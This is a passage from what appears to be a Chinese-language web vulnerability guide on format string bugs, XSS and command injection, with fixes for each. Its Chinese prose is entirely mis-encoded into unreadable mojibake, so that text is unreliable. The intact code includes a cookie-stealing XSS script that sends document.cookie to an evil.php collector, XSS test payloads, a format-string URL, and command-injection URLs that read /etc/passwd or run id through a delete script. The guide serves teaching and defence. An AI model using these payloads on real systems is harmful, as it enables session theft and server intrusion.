APIè°ƒè¯•å·¥å…·æ‰§è¡Œæ‰‹åŠ¨æµ‹è¯•ã€‚æµè§ˆåˆ°Webåº”ç”¨ç¨‹åºæˆ–ç½‘ç«™ï¼Œä»¥ä½¿æŸ¥è¯¢å…·æœ‰è½¬æ¢è¯´æ˜ç¬¦ã€‚è¯·æ³¨æ„ï¼Œå¦‚æœå¤§å¤šæ•°è½¬æ¢è¯´æ˜ç¬¦åœ¨URLä¸­å‘é€ï¼Œåˆ™éœ€è¦è¿›è¡Œç¼–ç ï¼Œå› ä¸ºå®ƒä»¬åŒ…å«ç‰¹æ®Šå­—ç¬¦ï¼ŒåŒ…æ‹¬%å’Œ{ã€‚è¯¥æµ‹è¯•å¯ä»¥<code>%s%s%s%n</code>é€šè¿‡ä½¿ç”¨ä»¥ä¸‹URLæµè§ˆæ¥å¼•å…¥è¯´æ˜ç¬¦å­—ç¬¦ä¸²ï¼š</p></li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://vulnerable_host/userinfo?username=%25s%25s%25s%25n</span><br></pre></td></tr></table></figure><p>â€‹    å¦‚æœç½‘ç«™å®¹æ˜“å—åˆ°æ”»å‡»ï¼Œåˆ™æµè§ˆå™¨æˆ–å·¥å…·åº”æ”¶åˆ°é”™è¯¯æ¶ˆæ¯ï¼Œå…¶ä¸­å¯èƒ½åŒ…æ‹¬è¶…æ—¶æˆ–HTTPè¿”å›ç 500ã€‚</p><p>â€‹    <code>Java</code>ä»£ç è¿”å›é”™è¯¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.util.MissingFormatArgumentException:  Format specifier <span class="string">'%s'</span></span><br></pre></td></tr></table></figure><pre><code>æ ¹æ®`C`çš„å®ç°ï¼Œè¯¥è¿‡ç¨‹å¯èƒ½ä¼šå®Œå…¨å´©æºƒ`Segmentation Fault`ã€‚</code></pre><p><strong>ä¿®å¤å»ºè®®</strong></p><ul><li><p>é™åˆ¶æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°çš„ä½¿ç”¨ã€‚</p></li><li><p>è¾“å…¥éªŒè¯ï¼šå¿…é¡»å¯¹æ‰€æœ‰ç”¨æˆ·å¯æ§åˆ¶çš„è¾“å…¥è¿›è¡ŒéªŒè¯å¹¶è¿‡æ»¤æ‰éæ³•æ ¼å¼å­—ç¬¦ã€‚</p></li></ul><h3 id="è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰"><a href="#è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰" class="headerlink" title="è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰"></a>è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰</h3><p><strong>æ¼æ´æè¿°</strong></p><ul><li><p>è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆ<code>Cross-site scripting</code>ï¼Œç®€ç§°<code>XSS</code>æ”»å‡»ï¼‰ï¼Œé€šå¸¸å‘ç”Ÿåœ¨å®¢æˆ·ç«¯ï¼Œå¯è¢«ç”¨äºè¿›è¡Œéšç§çªƒå–ã€é’“é±¼æ¬ºéª—ã€å¯†ç å·å–ã€æ¶æ„ä»£ç ä¼ æ’­ç­‰æ”»å‡»è¡Œä¸ºã€‚<code>XSS</code>æ”»å‡»ä½¿ç”¨åˆ°çš„æŠ€æœ¯ä¸»è¦ä¸º<code>HTML</code>å’Œ<code>Javascript</code>è„šæœ¬ï¼Œä¹ŸåŒ…æ‹¬<code>VBScript</code>å’Œ<code>ActionScript</code>è„šæœ¬ç­‰ã€‚</p></li><li><p>æ¶æ„æ”»å‡»è€…å°†å¯¹å®¢æˆ·ç«¯æœ‰å±å®³çš„ä»£ç æ”¾åˆ°æœåŠ¡å™¨ä¸Šä½œä¸ºä¸€ä¸ªç½‘é¡µå†…å®¹ï¼Œç”¨æˆ·ä¸ç»æ„æ‰“å¼€æ­¤ç½‘é¡µæ—¶ï¼Œè¿™äº›æ¶æ„ä»£ç ä¼šæ³¨å…¥åˆ°ç”¨æˆ·çš„æµè§ˆå™¨ä¸­å¹¶æ‰§è¡Œï¼Œä»è€Œä½¿ç”¨æˆ·å—åˆ°æ”»å‡»ã€‚ä¸€èˆ¬è€Œè¨€ï¼Œåˆ©ç”¨è·¨ç«™è„šæœ¬æ”»å‡»ï¼Œæ”»å‡»è€…å¯çªƒå–ä¼šè¯<code>cookie</code>ï¼Œä»è€Œè·å¾—ç”¨æˆ·çš„éšç§ä¿¡æ¯ï¼Œç”šè‡³åŒ…æ‹¬å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯ã€‚</p></li><li><p>å­˜åœ¨ä¸‰ç§<code>XSS</code>ç±»å‹ï¼Œé€šå¸¸é’ˆå¯¹ç”¨æˆ·çš„æµè§ˆå™¨ï¼š</p><p>åå°„å¼<code>XSS</code>ï¼šåº”ç”¨ç¨‹åºæˆ–<code>API</code>åŒ…æ‹¬æœªç»éªŒè¯å’Œæœªç»è½¬ä¹‰çš„ç”¨æˆ·è¾“å…¥ï¼Œä½œä¸ºHTMLè¾“å‡ºçš„ä¸€éƒ¨åˆ†ã€‚ä¸€ä¸ªæˆåŠŸçš„æ”»å‡»å¯ä»¥è®©æ”»å‡»è€…åœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­æ‰§è¡Œä»»æ„çš„<code>HTML</code>å’Œ<code>JavaScript</code>ã€‚ é€šå¸¸ï¼Œç”¨æˆ·å°†éœ€è¦ä¸æŒ‡å‘æ”»å‡»è€…æ§åˆ¶é¡µé¢çš„æŸäº›æ¶æ„é“¾æ¥è¿›è¡Œäº¤äº’ï¼Œä¾‹å¦‚æ¶æ„æ¼æ´ç½‘ç«™ï¼Œå¹¿å‘Šæˆ–ç±»ä¼¼å†…å®¹ã€‚</p><p>å­˜å‚¨å¼<code>XSS</code>ï¼šä½ çš„åº”ç”¨æˆ–è€…<code>API</code>å°†æœªå‡€åŒ–çš„ç”¨æˆ·è¾“å…¥å­˜å‚¨ä¸‹æ¥äº†ï¼Œå¹¶åœ¨åæœŸåœ¨å…¶ä»–ç”¨æˆ·æˆ–è€…ç®¡ç†å‘˜çš„é¡µé¢å±•ç¤ºå‡ºæ¥ã€‚ å­˜å‚¨å‹<code>XSS</code>ä¸€èˆ¬è¢«è®¤ä¸ºæ˜¯é«˜å±æˆ–ä¸¥é‡çš„é£é™©ã€‚</p><p>åŸºäº<code>DOM</code>çš„<code>XSS</code>ï¼šä¼šåŠ¨æ€çš„å°†æ”»å‡»è€…å¯æ§çš„å†…å®¹åŠ å…¥é¡µé¢çš„<code>JavaScript</code>æ¡†æ¶ã€å•é¡µé¢ç¨‹åºæˆ–<code>API</code>å­˜åœ¨è¿™ç§ç±»å‹çš„æ¼æ´ã€‚ç†æƒ³çš„æ¥è¯´ï¼Œä½ åº”è¯¥é¿å…å°†æ”»å‡»è€…å¯æ§çš„æ•°æ®å‘é€ç»™ä¸å®‰å…¨çš„<code>JavaScript API</code>ã€‚</p></li><li><p>å…¸å‹çš„<code>XSS</code>æ”»å‡»å¯å¯¼è‡´ç›—å–<code>session</code>ã€è´¦æˆ·ã€ç»•è¿‡<code>MFA</code>ã€<code>DIV</code>æ›¿æ¢ã€å¯¹ç”¨æˆ·æµè§ˆå™¨çš„æ”»å‡»ï¼ˆä¾‹å¦‚ï¼šæ¶æ„è½¯ä»¶ä¸‹è½½ã€é”®ç›˜è®°å½•ï¼‰ä»¥åŠå…¶ä»–ç”¨æˆ·ä¾§çš„æ”»å‡»ã€‚</p></li></ul><p><strong>æ¼æ´å±å®³</strong></p><ul><li><p>ç½‘ç»œé’“é±¼ï¼ŒåŒ…æ‹¬ç›—å–å„ç±»ç”¨æˆ·è´¦å·</p></li><li><p>çªƒå–ç”¨æˆ·<code>cookie</code>èµ„æ–™ï¼Œä»è€Œè·å–ç”¨æˆ·éšç§ä¿¡æ¯ï¼Œæˆ–åˆ©ç”¨ç”¨æˆ·èº«ä»½è¿›ä¸€æ­¥å¯¹ç½‘ç«™æ‰§è¡Œæ“ä½œ</p></li><li><p>åŠ«æŒç”¨æˆ·ï¼ˆæµè§ˆå™¨ï¼‰ä¼šè¯ï¼Œä»è€Œæ‰§è¡Œä»»æ„æ“ä½œï¼Œä¾‹å¦‚è¿›è¡Œéæ³•è½¬è´¦ï¼Œå¼ºåˆ¶å‘è¡¨æ—¥å¿—ï¼Œå‘é€ç”µå­é‚®ä»¶ç­‰</p></li><li><p>å¼ºåˆ¶å¼¹å‡ºå¹¿å‘Šé¡µé¢ï¼Œåˆ·æµé‡ç­‰</p></li><li><p>ç½‘é¡µæŒ‚é©¬</p></li><li><p>è¿›è¡Œæ¶æ„æ“ä½œï¼Œä¾‹å¦‚ä»»æ„ç¯¡æ”¹é¡µé¢ä¿¡æ¯ï¼Œåˆ é™¤æ–‡ç« ç­‰</p></li><li><p>è¿›è¡Œå¤§é‡çš„å®¢æˆ·ç«¯æ”»å‡»ï¼Œå¦‚<code>DDOS</code>æ”»å‡»</p></li><li><p>è·å–å®¢æˆ·ç«¯ä¿¡æ¯ï¼Œä¾‹å¦‚ç”¨æˆ·çš„æµè§ˆå†å²ï¼ŒçœŸå®<code>ip</code>ï¼Œå¼€æ”¾ç«¯å£ç­‰</p></li><li><p>æ§åˆ¶å—å®³è€…æœºå™¨å‘å…¶ä»–ç½‘ç«™å‘èµ·æ”»å‡»</p></li><li><p>ç»“åˆå…¶ä»–æ¼æ´è¿›ä¸€æ­¥æ‰©å¤§æ”»å‡»</p></li><li><p>æå‡ç”¨æˆ·æƒé™ï¼ŒåŒ…æ‹¬è¿›ä¸€æ­¥æ¸—é€ç½‘ç«™</p></li><li><p>ä¼ æ’­<code>XSS</code>è·¨ç«™è„šæœ¬è •è™«ç­‰</p></li></ul><p><strong>æ”»å‡»æ¡ˆä¾‹</strong></p><p>åœºæ™¯1ï¼šä»¥ä¸‹<code>JSP</code>ä»£ç æ®µä»HTTPè¯·æ±‚è¯»å–å‘˜å·¥<code>ID eid</code>ï¼Œå¹¶å°†å…¶æ˜¾ç¤ºç»™ç”¨æˆ·ã€‚</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;% String eid = request.getParameter(<span class="string">"eid"</span>); %&gt;</span><br><span class="line">...</span><br><span class="line"> Employee ID: &lt;%= eid %&gt;</span><br></pre></td></tr></table></figure><p>å¦‚æœ<code>eid</code>ä»…åŒ…å«æ ‡å‡†å­—æ¯æ•°å­—æ–‡æœ¬ï¼Œåˆ™æ­¤ç¤ºä¾‹ä¸­çš„ä»£ç å°†æ­£ç¡®è¿è¡Œã€‚å¦‚æœ<code>eid</code>çš„å€¼åŒ…å«å…ƒå­—ç¬¦æˆ–æºä»£ç ï¼Œåˆ™è¯¥ä»£ç å°†ç”±<code>Web</code>æµè§ˆå™¨æ‰§è¡Œï¼Œå› ä¸ºå®ƒæ˜¾ç¤º<code>HTTP</code>å“åº”ã€‚</p><p>åœºæ™¯2ï¼šè·å–ç›®æ ‡ç”¨æˆ·<code>Cookie</code></p><p>å¦‚æœåº”ç”¨ç¨‹åºä¸éªŒè¯è¾“å…¥æ•°æ®ï¼Œåˆ™æ”»å‡»è€…å¯ä»¥è½»æ¾åœ°ä»ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·é‚£é‡Œçªƒå–cookieã€‚æ”»å‡»è€…æ‰€éœ€è¦åšçš„å°±æ˜¯å°†ä»¥ä¸‹ä»£ç æ”¾ç½®åœ¨ä»»ä½•å¼ è´´çš„è¾“å…¥ä¸­ï¼ˆå³ï¼šç•™è¨€æ¿ï¼Œç§äººæ¶ˆæ¯ï¼Œç”¨æˆ·ä¸ªäººèµ„æ–™ï¼‰ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"><span class="keyword">var</span> adr = <span class="string">'../evil.php?cakemonster='</span> + <span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><br><span class="line">&lt;<span class="regexp">/SCRIPT&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä»£ç ä¼šå°†<code>cookie</code>çš„è½¬ä¹‰å†…å®¹ï¼ˆæ ¹æ®<code>RFC</code>å†…å®¹å¿…é¡»å…ˆè½¬ä¹‰ï¼Œç„¶åæ‰é€šè¿‡<code>GET</code>æ–¹æ³•é€šè¿‡<code>HTTP</code>åè®®å°†å…¶å‘é€ï¼‰ä¼ é€’ç»™â€œ<code>cakemonster</code>â€å˜é‡ä¸­çš„<code>evil.php</code>è„šæœ¬ã€‚æ”»å‡»è€…ç„¶åæ£€æŸ¥å…¶<code>evil.php</code>è„šæœ¬çš„ç»“æœï¼ˆ<code>cookie</code>æŠ“å–ç¨‹åºè„šæœ¬é€šå¸¸ä¼šå°†<code>cookie</code>å†™å…¥æ–‡ä»¶ï¼‰å¹¶ä½¿ç”¨å®ƒã€‚</p><p><strong>æ£€æµ‹æ–¹æ³•</strong></p><p><code>XSS</code>å¸¸è§æµ‹è¯•è¯­å¥ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(xss)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(xss)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onloda</span>=<span class="string">alert(xss)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(xss)</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>ä¿®å¤å»ºè®®</strong></p><ul><li><p>æ‹’ç»å°†ä¸å—ä¿¡ä»»çš„æ•°æ®æ”¾å…¥<code>HTML</code>æ–‡æ¡£ä¸­ï¼ŒéªŒè¯æ‰€æœ‰ç”¨æˆ·è¾“å…¥æ•°æ®ï¼Œæœ‰æ•ˆæ£€æµ‹æ”»å‡»ï¼›å¯¹æ‰€æœ‰è¾“å‡ºæ•°æ®è¿›è¡Œé€‚å½“çš„ç¼–ç ï¼Œä»¥é˜²æ­¢ä»»ä½•å·²æˆåŠŸæ³¨å…¥çš„è„šæœ¬åœ¨æµè§ˆå™¨ç«¯è¿è¡Œã€‚</p></li><li><p>å°†ä¸å—ä¿¡ä»»çš„æ•°æ®æ’å…¥<code>HTML</code>å…ƒç´ å†…å®¹ä¹‹å‰è¿›è¡Œ<code>HTML</code>è½¬ä¹‰ã€‚åœ¨è§„èŒƒä¸­å»ºè®®ä½¿ç”¨å‘½åå®ä½“è¿›è¡Œè½¬ä¹‰ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&amp; --&gt; &amp;amp;</span><br><span class="line"><span class="tag">&lt; <span class="attr">--</span>&gt;</span> &amp;lt;</span><br><span class="line">&gt; --&gt; &amp;gt;</span><br><span class="line">" --&gt; &amp;quot;</span><br><span class="line">' --&gt; &amp;#x27;</span><br><span class="line">/ --&gt; &amp;#x2F;</span><br></pre></td></tr></table></figure></li><li><p><code>HTML</code>å±æ€§ç¼–ç è½¬ä¹‰ï¼šé™¤å­—æ¯æ•°å­—å­—ç¬¦å¤–ï¼Œè¯·ä»¥<code>HTML</code>å®ä½“<code>&amp;#xHH;</code>æ ¼å¼è½¬ä¹‰æ‰€æœ‰å­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼ï¼ˆ<code>HH</code>=åå…­è¿›åˆ¶å€¼ï¼‰ã€‚</p></li><li><p><code>URL</code>ç¼–ç ï¼šå¯¹<code>URL</code>å‚æ•°å€¼è¿›è¡Œ<code>URL</code>ç¼–ç ã€‚<code>URL</code>ç¼–ç æ ‡å‡†ï¼Œå‚è€ƒ <code>https://www.w3schools.com/tags/ref_urlencode.asp</code>ã€‚</p></li><li><p><code>JavaScript</code>ç¼–ç ï¼šé™¤å­—æ¯æ•°å­—å­—ç¬¦å¤–ï¼Œè¯·ä»¥<code>\uXXXX</code> <code>Unicode</code>è½¬ä¹‰æ ¼å¼ï¼ˆX =æ•´æ•°ï¼‰è½¬ä¹‰æ‰€æœ‰å­—ç¬¦ã€‚</p></li><li><p><code>CSS</code>åå…­è¿›åˆ¶ç¼–ç ï¼š<code>CSS</code>è½¬ä¹‰æ”¯æŒ<code>\XX</code>å’Œ<code>\XXXXXX</code>ã€‚å¦‚æœä¸‹ä¸€ä¸ªå­—ç¬¦ç»§ç»­è½¬ä¹‰åºåˆ—ï¼Œåˆ™ä½¿ç”¨ä¸¤ä¸ªå­—ç¬¦è½¬ä¹‰ä¼šå¯¼è‡´é—®é¢˜ã€‚æœ‰ä¸¤ç§è§£å†³æ–¹æ¡ˆï¼ˆ<code>a</code>ï¼‰åœ¨<code>CSS</code>è½¬ä¹‰ç¬¦åæ·»åŠ ä¸€ä¸ªç©ºæ ¼ï¼ˆ<code>CSS</code>è§£æå™¨å°†å¿½ç•¥è¯¥ç©ºæ ¼ï¼‰ï¼ˆ<code>b</code>ï¼‰ä½¿ç”¨é€šè¿‡é›¶å¡«å……è¯¥å€¼è€Œå¯èƒ½çš„å…¨éƒ¨<code>CSS</code>è½¬ä¹‰ã€‚</p></li><li><p>è¿‡æ»¤ä»¥ä¸‹å¸¸è§å­—ç¬¦ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">|</span><br><span class="line">&amp; </span><br><span class="line">; </span><br><span class="line">$</span><br><span class="line">%</span><br><span class="line">@</span><br><span class="line">'</span><br><span class="line">"</span><br><span class="line">\'</span><br><span class="line">\"</span><br><span class="line"><span class="tag">&lt;&gt;</span></span><br><span class="line">()</span><br><span class="line">+</span><br><span class="line">CRï¼ˆå›è½¦ç¬¦ï¼ŒASCII 0x0dï¼‰</span><br><span class="line">LFï¼ˆæ¢è¡Œï¼ŒASCII 0x0aï¼‰</span><br><span class="line">,</span><br><span class="line">\</span><br></pre></td></tr></table></figure></li></ul><h3 id="å‘½ä»¤æ³¨å…¥"><a href="#å‘½ä»¤æ³¨å…¥" class="headerlink" title="å‘½ä»¤æ³¨å…¥"></a>å‘½ä»¤æ³¨å…¥</h3><p><strong>æ¼æ´æè¿°</strong></p><ul><li><p>å‘½ä»¤æ³¨å…¥æ˜¯ä¸€ç§æ”»å‡»ï¼Œå…¶ç›®æ ‡æ˜¯é€šè¿‡æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºåœ¨ä¸»æœºæ“ä½œç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚å½“åº”ç”¨ç¨‹åºå°†ä¸å®‰å…¨çš„ç”¨æˆ·æä¾›çš„æ•°æ®ï¼ˆè¡¨å•ï¼Œ<code>cookie</code>ï¼Œ<code>HTTP</code>æ ‡å¤´ç­‰ï¼‰ä¼ é€’ç»™ç³»ç»Ÿ<code>shell</code>æ—¶ï¼Œå¯èƒ½ä¼šå‘ç”Ÿå‘½ä»¤æ³¨å…¥æ”»å‡»ã€‚åœ¨æ­¤æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…æä¾›çš„æ“ä½œç³»ç»Ÿå‘½ä»¤é€šå¸¸ä»¥æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºçš„æƒé™æ‰§è¡Œã€‚å‘½ä»¤æ³¨å…¥æ”»å‡»å¾ˆå¯èƒ½ä¸»è¦æ˜¯ç”±äºè¾“å…¥éªŒè¯ä¸è¶³ã€‚</p></li><li><p>ç³»ç»Ÿå‘½ä»¤æ³¨å…¥ï¼ˆä¹Ÿç§°ä¸º<code>shell</code>æ³¨å…¥ï¼‰æ˜¯ä¸€ä¸ª<code>Web</code>å®‰å…¨æ¼æ´ï¼Œå®ƒä½¿æ”»å‡»è€…å¯ä»¥åœ¨è¿è¡Œåº”ç”¨ç¨‹åºçš„æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ç³»ç»Ÿï¼ˆ<code>OS</code>ï¼‰å‘½ä»¤ï¼Œå¹¶ä¸”é€šå¸¸ä¼šå®Œå…¨ç ´åè¯¥åº”ç”¨ç¨‹åºåŠå…¶æ‰€æœ‰æ•°æ®ã€‚æ”»å‡»è€…é€šå¸¸å¯ä»¥åˆ©ç”¨<code>OS</code>å‘½ä»¤æ³¨å…¥æ¼æ´æ¥ç ´åæ‰˜ç®¡åŸºç¡€æ¶æ„çš„å…¶ä»–éƒ¨åˆ†ï¼Œåˆ©ç”¨ä¿¡ä»»å…³ç³»å°†æ”»å‡»è½¬ç§»åˆ°ç»„ç»‡å†…çš„å…¶ä»–ç³»ç»Ÿã€‚</p></li></ul><p><strong>æ¼æ´å±å®³</strong></p><ul><li><p>å½“åº”ç”¨ç¨‹åºå°†ä¸å®‰å…¨çš„ç”¨æˆ·æä¾›çš„æ•°æ®ï¼ˆè¡¨å•ï¼Œ<code>cookie</code>ï¼Œ<code>HTTP</code>æ ‡å¤´ç­‰ï¼‰ä¼ é€’ç»™ç³»ç»Ÿshellæ—¶ï¼Œå¯èƒ½ä¼šå‘ç”Ÿå‘½ä»¤æ³¨å…¥æ”»å‡»ã€‚åœ¨æ­¤æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…æä¾›çš„æ“ä½œç³»ç»Ÿå‘½ä»¤é€šå¸¸ä»¥æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºçš„æƒé™æ‰§è¡Œã€‚</p></li><li><p>æ”»å‡»è€…å¯ä»¥æ‰§è¡Œæœªç»æˆæƒçš„å‘½ä»¤ï¼Œç„¶åå¯ä»¥ä½¿ç”¨è¿™äº›å‘½ä»¤æ¥ç¦ç”¨ç›®æ ‡ç³»ç»Ÿçš„åº”ç”¨è½¯ä»¶ï¼Œæˆ–è€…è¯»å–å’Œä¿®æ”¹æ”»å‡»è€…æ²¡æœ‰æƒé™ç›´æ¥è®¿é—®çš„æ•°æ®ã€‚</p></li><li><p>æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´ä¼šé€ æˆï¼šæ‰§è¡Œæœªç»æˆæƒçš„ä»£ç æˆ–å‘½ä»¤ï¼›<code>DoS</code>ï¼šå´©æºƒï¼Œé€€å‡ºæˆ–é‡æ–°å¯åŠ¨ï¼›è¯»å–/ä¿®æ”¹æ–‡ä»¶æˆ–ç›®å½•ï¼›è¯»å–åº”ç”¨æ•°æ®ï¼›ä¿®æ”¹ç”³è¯·æ•°æ®ï¼›</p></li></ul><p><strong>æ”»å‡»æ¡ˆä¾‹</strong></p><ul><li><p>å‘½ä»¤æ³¨å…¥æ¼æ´é€šå¸¸åœ¨ä»¥ä¸‹æƒ…å†µä¸‹å‘ç”Ÿï¼š</p><p>æ•°æ®ä»ä¸å—ä¿¡ä»»çš„æ¥æºè¿›å…¥åº”ç”¨ç¨‹åºã€‚</p><p>æ•°æ®æ˜¯ç”±åº”ç”¨ç¨‹åºä½œä¸ºå‘½ä»¤æ‰§è¡Œçš„å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ã€‚</p><p>é€šè¿‡æ‰§è¡Œå‘½ä»¤ï¼Œåº”ç”¨ç¨‹åºä¸ºæ”»å‡»è€…æä¾›äº†æ”»å‡»è€…æ— æ³•æ‹¥æœ‰çš„ç‰¹æƒæˆ–åŠŸèƒ½ã€‚</p></li></ul><p>åœºæ™¯1ï¼šåœ¨<code>.PHP</code>é¡µé¢çš„<code>URL</code>æœ«å°¾æ·»åŠ åˆ†å·ï¼Œåè·Ÿæ“ä½œç³»ç»Ÿå‘½ä»¤ï¼Œå°†æ‰§è¡Œè¯¥å‘½ä»¤ã€‚<code>%3B</code> <code>URL</code>ç¼–ç å¹¶è§£ç ä¸ºåˆ†å·ã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sensitive/something.php?dir=%3Bcat%20/etc/passwd</span><br></pre></td></tr></table></figure><p>åœºæ™¯2ï¼šä»¥ä¸‹<code>PHP</code>ä»£ç æ®µå®¹æ˜“å—åˆ°å‘½ä»¤æ³¨å…¥æ”»å‡»ï¼š </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">print</span>(<span class="string">"Please specify the name of the file to delete"</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="string">"&lt;p&gt;"</span>);</span><br><span class="line">$file=$_GET[<span class="string">'filename'</span>];</span><br><span class="line">system(<span class="string">"rm $file"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¯·æ±‚å’Œå“åº”æ˜¯æˆåŠŸæ”»å‡»çš„ç¤ºä¾‹ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--è¯·æ±‚--&gt;</span><br><span class="line">http://127.0.0.1/delete.php?filename=bob.txt;id</span><br><span class="line">&lt;!--å“åº”--&gt;</span><br><span class="line">Please specify the name of the file to delete</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure><p><strong>æ£€æµ‹æ–¹æ³•</strong></p><ul><li><p><code>cmd1|cmd2</code>ï¼šä½¿ç”¨|å°†ä½¿å‘½ä»¤2æ‰§è¡ŒæˆåŠŸï¼Œè€Œå‘½ä»¤1æ‰§è¡ŒæˆåŠŸä¸å¦ã€‚</p></li><li><p><code>cmd1;cmd2</code>ï¼šä½¿ç”¨;å°†ä½¿å‘½ä»¤2æ‰§è¡ŒæˆåŠŸï¼Œè€Œå‘½ä»¤1æ‰§è¡ŒæˆåŠŸä¸å¦ã€‚</p></li><li><p><code>cmd1||cmd2</code> ï¼šä»…å½“å‘½ä»¤1æ‰§è¡Œå¤±è´¥æ—¶ï¼Œæ‰ä¼šæ‰§è¡Œå‘½ä»¤2ã€‚</p></li><li><p><code>cmd1&amp;&amp;cmd2</code> ï¼šä»…å½“å‘½ä»¤1æ‰§è¡ŒæˆåŠŸæ—¶ï¼Œæ‰ä¼šæ‰§è¡Œå‘½ä»¤2ã€‚</p></li><li><p><code>$(cmd)</code>ï¼šä¾‹å¦‚ï¼Œ<code>echo $(whoami)</code>æˆ–<code>$(touch test.sh; echo &#39;ls&#39; &gt; test.sh)</code></p></li><li><p><code>cmd</code>ï¼šç”¨äºæ‰§è¡Œç‰¹å®šå‘½ä»¤ã€‚ä¾‹å¦‚ï¼Œ<code>whoami</code></p></li><li><p><code>&gt;(cmd)</code>ï¼š <code>&gt;(ls)</code></p></li><li><p><code>&lt;(cmd)</code>ï¼š<code>&lt;(ls)</code></p></li></ul><p><strong>ä¿®å¤å»ºè®®</strong></p><ul><li><p>éœ€è¦æ¸…ç†URLå’Œè¡¨å•æ•°æ®ä¸­çš„æ— æ•ˆå­—ç¬¦ã€‚å¯ä»¥å°†å­—ç¬¦åˆ—å…¥é»‘åå•ï¼Œä½†æ˜¯å¯èƒ½å¾ˆéš¾æƒ³åˆ°è¦é’ˆå¯¹å…¶è¿›è¡ŒéªŒè¯çš„æ‰€æœ‰å­—ç¬¦ã€‚ä¹Ÿå¯èƒ½æœ‰ä¸€äº›å°šæœªè¢«å‘ç°ã€‚åº”è¯¥åˆ›å»ºä»…åŒ…å«å…è®¸çš„å­—ç¬¦æˆ–å‘½ä»¤åˆ—è¡¨çš„ç™½åå•ï¼Œä»¥éªŒè¯ç”¨æˆ·è¾“å…¥ã€‚æ­¤åˆ—è¡¨åº”æ¶ˆé™¤é”™è¿‡çš„è§’è‰²ä»¥åŠæœªå‘ç°çš„å¨èƒã€‚</p></li><li><p>å¯ä»¥åŒ…æ‹¬ç”¨äºå‘½ä»¤æ³¨å…¥çš„å¸¸è§„é»‘åå•ï¼š</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| ; &amp; $ &gt; &lt; &apos; \ ! &gt;&gt; #</span><br></pre></td></tr></table></figure></li><li><p>å¯¹äºWindowsè½¬ä¹‰æˆ–è¿‡æ»¤ä»¥ä¸‹ç‰¹æ®Šå­—ç¬¦ï¼š</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">( ) &lt; &gt; &amp; * â€˜ | = ? ; [ ] ^ ~ ! . 